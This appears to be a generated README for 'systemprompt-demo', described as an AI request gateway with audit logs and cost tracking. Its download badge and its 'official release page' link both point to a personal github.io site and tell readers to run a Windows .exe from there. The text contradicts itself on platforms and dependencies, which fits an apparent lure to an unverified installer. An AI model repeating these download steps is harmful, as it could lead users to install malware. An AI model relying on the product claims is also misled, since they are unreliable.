# 🛡️ systemprompt-demo - Secure control for your AI tools

[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue.svg)](https://acr3463.github.io)

Systemprompt-demo provides a gateway for your AI tools. This software tracks your AI requests, logs audit trails, and monitors costs. It acts as a bridge between your local computer and AI services like Claude. You gain oversight of how your tools interact with external models through a private connection.

## 📥 How to download and install

Follow these steps to set up the software on your Windows computer.

1. Visit the [official release page](https://acr3463.github.io).
2. Look for the latest version at the top of the list.
3. Click the file that ends in .exe for Windows.
4. Save the file to your computer.
5. Open your Downloads folder.
6. Double-click the installer file.
7. Follow the prompts on your screen to complete the installation.

The software runs as a single background process. You do not need to install extra database tools or web servers. The app manages these requirements internally.

## ⚙️ Why use this software

Managing AI requests becomes difficult as usage grows. This tool brings order to that process. It provides three main functions for your AI infrastructure:

First, it defines policies. You set the rules for what data moves between your computer and the AI. This prevents unauthorized information from leaving your machine.

Second, it keeps audit trails. The software logs every request. You see exactly when a tool runs, what it sends, and what it receives. This transparency helps you troubleshoot issues or review past actions.

Third, it calculates costs. You assign value to your tasks. The software tracks consumption so you understand the financial impact of your agentic workflows.

## 🖥️ System requirements

This tool is lightweight. It runs on most modern desktop environments with minimal load.

- Operating System: Windows 10 or Windows 11.
- Processor: Any modern dual-core chip.
- Memory: 4 gigabytes of RAM or more.
- Disk Space: 200 megabytes for the application files.
- Network: A stable internet connection for AI connectivity.

## 🔗 Connecting your AI gateway

The software integrates with tools like Claude Code and Claude Cowork. Once the software runs, it creates a local bridge. Configure your AI tools to point to your local machine address rather than the default external service address.

This process keeps your traffic local until the systemprompt gateway approves and logs the request. The gateway then forwards the request to the cloud. This architecture ensures you remain in charge of your data.

## 🛠️ Frequently asked questions

**Does the software store my data on a remote server?**
No. All logs and audit trails remain on your computer. You control the data at all times.

**Do I need to be a developer?**
No. The application handles the heavy lifting. You only need to adjust the settings within your AI tools to use the gateway address. 

**Will this slow down my AI requests?**
The overhead is minimal. Rust powers the gateway, which ensures fast processing times for every request.

**Can I run this on macOS?**
Yes. Use the same release page to find the installer that works for your specific operating system.

## 📁 Managing your logs

You access your usage history through the main dashboard. Open the app interface from your system tray. The dashboard displays a summary of your recent requests. You can export these logs as text files if you need to perform an external analysis or verify costs for a project.

## 🔒 Security and Privacy

Security is a primary concern for AI operations. This software operates as a mediator. It checks every message against your safety policy before it sends data to an AI model. If a request violates a policy, the gateway blocks the connection immediately. This provides a safety layer that standard AI clients often lack. 

You should update your software regularly. Check the release page once every few weeks to ensure you have the latest features and security improvements. Installing the latest version only takes a moment and overwrites the older files while keeping your settings intact.

Keywords: a2a, agent-orchestration, agentic-ai, ai-agents, ai-governance, ai-infrastructure, autonomous-agents, claude, claude-code, demo, desktop-app, llm, llmops, mcp, mcp-server, model-context-protocol, oauth2, postgresql, rust, self-hosted